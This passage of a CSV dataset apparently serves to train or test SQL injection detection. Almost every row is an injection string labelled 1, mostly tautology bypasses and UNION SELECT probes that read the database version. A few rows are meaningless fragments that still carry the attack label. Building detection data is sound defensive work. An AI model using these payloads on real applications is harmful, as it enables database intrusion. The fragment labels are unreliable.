,Sentence,Label
313," select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
314, select * from users where id = 1 % ( $ )  or 1 = 1 -- 1,1
315, select * from users where id = 1 % ( @ )  or 1 = 1 -- 1,1
316, select * from users where id = 1 <@. or 1 = 1 -- 1,1
317, select * from users where id = 1 <@.. or 1 = 1 -- 1,1
318," select * from users where id = 1<@.. union select 1,version (  )  -- 1",1
319," select * from users where id = 1 <@. union select 1,version (  )  -- 1",1
320," select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1",1
321," select * from users where id = 1 *\. union select null,@@VERSION -- 1",1
322, select * from users where id = 1 <@.$ or 1 = 1 -- 1,1
323," select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",1
324, select * from users where id = 1 *1 or 1 = 1 -- 1,1
325," select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1
326," select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1
327," select * from users where id = 1 <1## union select 1,version (  )  -- 1",1
328, select * from users where id = 1 <@1$ or 1 = 1 -- 1,1
329," select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1
330," select * from users where id = 1 *\ union select null,@@VERSION -- 1",1
331, select * from users where id = 1 <@$ or 1 = 1 -- 1,1
332, select * from users where id = 1 %$ . or 1 = 1 -- 1,1
333," select * from users where id = 1 *$ . union select null,@@VERSION -- 1",1
334, select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1
335," select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1
336, select * from users where id = 1 <@$_ or 1 = 1 -- 1,1
337," select * from users where id = 1 <@$_ union select 1,version (  )  -- 1",1
338, select * from users where id = 1 <@<@ or 1 = 1 -- 1,1
339, select * from users where id = 1 %!<1 or 1 = 1 -- 1,1
340," select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1
341," select * from users where id = 1<@<@ union select 1,version (  )  -- 1",1
342," select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1",1
343," select * from users where id = 1 <@<@ union select null,version (  )  -- 1",1
344, select * from users where id = 1 %!<@ or 1 = 1 -- 1,1
345," select * from users where id = 1 <@&@ union select 1,version (  )  -- 1",1
346," select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1
347, select * from users where id = 1 &@ or 1 = 1 -- 1,1
348," select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'",1
349," select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'",1
350," select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'",1
351," select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
352, select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1
353," select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1
354," select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'",1
355," select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",1
356," select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'",1
357," select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
358, select * from users where id = '1'   or 1 = 1 -- 1',1
359," select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
360," select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1
361, select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1
362," select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'",1
363, select * from users where id = '1' or $<\ or 1 = 1 -- 1',1
364," select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",1
365," select * from users where id = '1' or $<\ union select 1,@@VERSION -- 1'",1
366," select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1
367, select * from users where id = '1' or \<\. or 1 = 1 -- 1',1
368," select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'",1
369, select * from users where id = '1' or \<1 or 1 = 1 -- 1',1
370," select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1
371," select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1
372, select * from users where id = '1' or \<$ or 1 = 1 -- 1',1
373," select * from users where id = '1' or \<$ union select 1,@@VERSION -- 1'",1
374," select * from users where id = '1' or \<  = 1 union select 1,@@VERSION -- 1'",1
375, select * from users where id = '1' or !<@ or 1 = 1 -- 1',1
376," select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1
377," select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'",1
378," select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'",1
379," select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",1
380," select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1",1
381," select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",1
382," select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1
383," select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1
384,s,1
385," select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1",1
386," select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1
387," select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1
388," select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1",1
389," select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1",1
390," select * from users where id = 1 or 1#"" (  union select null,version (  )  -- 1",1
391," select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1
392," select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1
393," select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1
394," select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1",1
395," select * from users where id = 1 or @#"" (  = 1 union select 1,version (  )  -- 1",1
396," select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1
397," select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1
398," select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",1
399," select * from users where id = 1 or "" )  ( "" = 1 or 1 = 1 -- 1",1
400," select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1
401," select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1
402," select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1
403,s,1
404," select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1
405," select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1
406," select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1
407," select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",1
408," select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1
409," select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1
410," select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1
411," select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1
412," select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1
413," select * from users where id = 1 or "",."" or 1 = 1 -- 1",1
414,s,1
415," select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1
416," select * from users where id = 1 or "",?"" or 1 = 1 -- 1",1
417," select * from users where id = 1 or 1#"", union select 1,version (  )  -- 1",1
418," select * from users where id = 1 or 1#"", union select version (  ) ,version (  )  -- 1",1
419," select * from users where id = 1 or 1#"", union select 'a',version (  )  -- 1",1
420," select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1
421," select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1
422," select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1
423," select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1",1
424," select * from users where id = 1 or "",&"" or 1 = 1 -- 1",1
425," select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
426," select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1
427," select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
428," select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1
429," select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1
430,s,1
431," select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1
432," select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1
433," select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1",1
434," select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1",1
435," select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
436," select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1
437," select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1
438," select * from users where id = 1 or "".["" or 1 = 1 -- 1",1
439," select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1
440," select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1
441," select * from users where id = 1 or 1#"". = 1 union select 1,version (  )  -- 1",1
442," select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1
443," select * from users where id = 1 or "".@"" or 1 = 1 -- 1",1
444," select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
445," select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1
446," select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",1
447," select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
448,s,1
449," select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1
450," select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1
451," select * from users where id = 1 or 1#""1 union select 1,version (  )  -- 1",1
452," select * from users where id = 1 or 1#""1 union select version (  ) ,version (  )  -- 1",1
453," select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1",1
454," select * from users where id = 1 or 1#""1 union select null,version (  )  -- 1",1
455," select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",1
456," select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1
457," select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1
458," select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1
459," select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1
460," select * from users where id = '1' or """"<@ union select 1,version (  )  -- 1'",1
461,&1c,1
462, ( s,1
463, ) s,1
464,",s",1
465,.s,1
466,1s,1
467,;s,1
468,?s,1
469,UE1,1
470,UEf,1
471,UEs,1
472,UEv,1
473,c,1
474,n,1
475,ns,1
476,os,1
477,s,1
478,v,1
479,{s,1
480," select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1
481," select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1
482," select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
483," select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
484," select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",1
485," select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1
486,s,1
487," select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1
488," select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1",1
489," select * from users where id = 1 or 1#""; union select version (  ) ,version (  )  -- 1",1
490," select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1",1
491," select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1
492," select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1
493," select * from users where id = 1 or "";["" or 1 = 1 -- 1",1
494," select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1
495," select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1
496," select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1
497," select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1
498," select * from users where id = '1' union select "";""_,version (  )  -- 1'",1
499," select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1
500," select * from users where id = 1 or "";{"" or 1 = 1 -- 1",1
501," select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
502," select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1
503," select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1",1
504," select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1
505," select * from users where id = '1' union select $[""],@@VERSION -- 1'",1
506," select * from users where id = 1 or ""]."" or 1 = 1 -- 1",1
507," select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1
508,s,1
509," select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1
510," select * from users where id = 1 or ""??"" or 1 = 1 -- 1",1
511," select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1",1
512," select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1",1
513," select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1",1
514," select * from users where id = 1 or 1#""? union select null,version (  )  -- 1",1
515," select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1
516," select * from users where id = 1 or ""?["" or 1 = 1 -- 1",1
517," select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1
518," select * from users where id = 1 or 1#""? = 1 or 1 = 1 -- 1",1
519," select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1",1
520," select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1
521," select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1
522," select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
523," select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1
524," select * from users where id = '1' union select ||/1,version (  )  -- 1'",1
525," select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1
526," select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1
527," select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1
528," select * from users where id = '1' union select \,@@VERSION -- 1'",1
529," select * from users where id = '1' union select \.,@@VERSION -- 1'",1
530," select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
531," select * from users where id = '1' union select \.%1,@@VERSION -- 1'",1
532," select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",1
533," select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1
534," select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
535," select * from users where id = '1' union select \#,@@VERSION -- 1'",1
536," select * from users where id = '1' union select $ .,@@VERSION -- 1'",1
537," select * from users where id = '1' union select $ _,@@VERSION -- 1'",1
538," select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
539," select * from users where id = '1' union select +\,@@VERSION -- 1'",1
540," select * from users where id = '1' union select +\.,@@VERSION -- 1'",1
541," select * from users where id = '1' union select !<1,version (  )  -- 1'",1
542," select * from users where id = '1' union select +\#,@@VERSION -- 1'",1
543," select * from users where id = '1' union select !<@,version (  )  -- 1'",1
544," select * from users where id = '1' union select @ 1,version (  )  --  1'",1
545," select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'",1
546," select * from users where id = '1' union select @ @1,version (  )  --  1'",1
547," select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",1
548," select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1
549," select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1
550," select * from users where id = '1' union select ""[""_,version (  )  -- 1'",1
551,s,1
552," select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1
553," select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
554," select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1
555," select * from users where id = 1 or 1#""$ union select version (  ) ,version (  )  -- 1",1
556," select * from users where id = 1 or 1#""$ union select 'a',version (  )  -- 1",1
557," select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1
558," select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1
559," select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
560," select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1
561," select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1
562," select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1
563," select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",1
564, select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1
565," select * from users where id = '1' +  ( \ )  union select 1,@@VERSION -- 1'",1
566," select * from users where id = '1' +  ( \. )  union select 1,@@VERSION -- 1'",1
567," select * from users where id = '1' * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1'",1
568," select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
569," select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1
570," select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1
571, select * from users where id = '1'<@.. or 1 = 1 -- 1',1
572," select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
573, select * from users where id = '1' <@.$ or 1 = 1 -- 1',1
574," select * from users where id = '1' <@._ union select 1,version (  )  -- 1'",1
575," select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
576," select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
577," select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'",1
578," select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1
579,s,1
580," select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1
581," select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1
582," select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
583, select * from users where id = '1' *$ . or 1 = 1 -- 1',1
584," select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1
585, select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
